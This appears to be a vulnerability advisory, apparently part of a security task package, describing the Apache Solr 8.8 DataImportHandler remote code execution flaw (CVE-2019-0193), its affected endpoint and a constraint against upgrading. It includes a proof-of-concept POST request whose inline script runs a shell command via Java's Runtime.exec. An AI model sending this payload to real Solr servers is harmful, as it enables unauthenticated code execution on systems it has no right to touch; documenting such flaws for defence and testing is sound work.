# Apache Solr 8.8 — DataImportHandler RCE (CVE-2019-0193)

## Severity
**High** (CVSS 7.5)

## CVE / CWE
- CVE-2019-0193
- CWE-94: Improper Control of Generation of Code

## Description
Apache Solr's DataImportHandler (DIH) allows the `dataConfig` request
parameter to specify a data source configuration inline. When combined with
the `ScriptTransformer` (or `TemplateTransformer`), an attacker can supply a
malicious `dataConfig` containing a JavaScript snippet that is executed
server-side by the Java scripting engine. This achieves unauthenticated remote
code execution as the Solr process user.

Example exploit request:
```
POST /solr/testcore/dataimport?command=full-import&verbose=false&clean=false&commit=true
Content-Type: application/x-www-form-urlencoded

dataConfig=<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
    function poc(row) {
      var runtime = java.lang.Runtime.getRuntime();
      var proc = runtime.exec("id");
      ...
      return row;
    }
  ]]></script>
  <document>
    <entity name="e" url="http://localhost/"
            processor="XPathEntityProcessor"
            forEach="/html"
            transformer="script:poc"/>
  </document>
</dataConfig>
```

No authentication is required in the default Solr configuration.

## Affected Service
- **Service:** Apache Solr 8.8 (and all versions with DIH before security
  controls were added)
- **Port:** 8983/TCP
- **Vulnerable endpoint:** `/solr/<core>/dataimport`

## Constraints
- Solr must not be upgraded; it stays at version 8.8.
